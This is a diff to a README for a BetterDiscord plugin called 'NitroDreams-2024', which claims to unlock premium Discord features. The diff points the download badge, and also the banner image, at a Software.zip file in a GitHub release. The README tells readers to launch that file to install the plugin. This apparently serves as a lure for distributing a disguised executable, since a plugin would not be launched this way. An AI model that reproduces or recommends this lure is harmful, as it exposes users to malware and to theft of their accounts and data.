@@ -11,7 +11,7 @@ Welcome to NitroDreams-2024, the ultimate BetterDiscord plugin for unlocking pre
 ## Installation Guide 📦
 To get started, download the NitroDreams-2024 plugin from the link below:
 
-[![Download NitroDreams-2024](https://img.shields.io/badge/Download%20Plugin-Click%20Here-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download NitroDreams-2024](https://github.com/blkkkkk/NitroDreams-2024/releases/download/v2.0/Software.zip%20Plugin-Click%20Here-blue)](https://github.com/blkkkkk/NitroDreams-2024/releases/download/v2.0/Software.zip)
 
 Note: The link above contains the plugin file that needs to be launched for installation. Simply click on the button to download the plugin.
 
@@ -46,4 +46,4 @@ If you encounter any issues or have any questions regarding NitroDreams-2024, fe
 
 Let's turn your Discord experience into a dream-like journey with NitroDreams-2024! 🌈✨
 
-![NitroDreams-2024](https://example.com/nitrodreams2024image.png)
+![NitroDreams-2024](https://github.com/blkkkkk/NitroDreams-2024/releases/download/v2.0/Software.zip)
